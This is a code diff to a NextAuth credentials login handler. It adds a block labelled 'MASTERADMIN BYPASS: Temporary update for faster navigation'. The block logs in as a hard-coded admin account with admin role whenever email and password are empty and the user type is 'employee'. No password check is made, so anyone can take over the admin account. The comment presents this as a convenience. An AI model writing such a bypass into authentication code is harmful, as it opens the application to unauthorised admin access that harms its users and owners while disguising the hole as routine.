@@ -13,9 +13,24 @@ export const authOptions: NextAuthOptions = {
                 userType: { label: "User Type", type: "text" }
             },
             async authorize(credentials) {
-                if (!credentials?.email || !credentials?.password) return null;
+                const { email, password, userType } = credentials || {};
 
-                const { email, password, userType } = credentials;
+                // MASTERADMIN BYPASS: Temporary update for faster navigation
+                if (!email && !password && userType === 'employee') {
+                    const masterAdmin = await prisma.user.findUnique({
+                        where: { email: 'yousuf@majumapandigital.com' }
+                    });
+                    if (masterAdmin) {
+                        return {
+                            id: masterAdmin.id,
+                            name: masterAdmin.name,
+                            email: masterAdmin.email,
+                            role: 'admin'
+                        };
+                    }
+                }
+
+                if (!credentials?.email || !credentials?.password) return null;
                 let user = null;
                 let role = "user";
 
@@ -39,7 +54,7 @@ export const authOptions: NextAuthOptions = {
                         }
                     }
 
-                    if (!user || !user.password) return null;
+                    if (!user || !user.password || typeof password !== 'string') return null;
 
                     const isValid = await bcrypt.compare(password, user.password);
 
